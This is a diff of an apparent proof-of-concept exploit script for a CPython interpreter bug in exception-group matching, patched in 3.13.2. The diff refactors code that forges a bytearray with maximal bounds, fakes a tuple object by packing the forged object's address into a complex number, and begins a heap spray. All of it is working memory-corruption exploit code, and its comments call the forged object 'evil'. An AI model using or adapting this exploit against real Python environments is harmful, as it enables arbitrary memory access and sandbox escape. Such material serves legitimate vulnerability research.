@@ -46,20 +46,15 @@ _PyEval_ExceptionGroupMatch(PyObject* exc_value, PyObject *match_type,
 # This script does some heap grooming to set up the memory where we can return an object that looks like a tuple, but will
 # actually contain our evil object.
 
-p64 = lambda num: num.to_bytes(8, 'little')
-fake_bytearray = (
-    p64(0x12345) +
-    p64(id(bytearray)) +
-    p64(2**63 - 1) + 
-    p64(2**63 - 1) + 
-    p64(0) + 
-    p64(0) 
-)
+from common import evil_bytearray_obj, check_pyversion, i2f
+
+check_pyversion(patched_ver=(3, 13, 2))
+
+# see ./common/common.py for evil bytearray obj explanation
+fake_ba, ba_addr = evil_bytearray_obj()
 
 # complex objects are perfect for creating fake tuples (explanation below)
-FAKE_OBJ_ADDR = id(fake_bytearray) + bytes.__basicsize__ - 1
-i2f = lambda num: 5e-324 * num
-fake_tuple = 1j * i2f(FAKE_OBJ_ADDR)
+fake_tuple = 1j * i2f(ba_addr)
 
 spray = []
 for i in range(100):
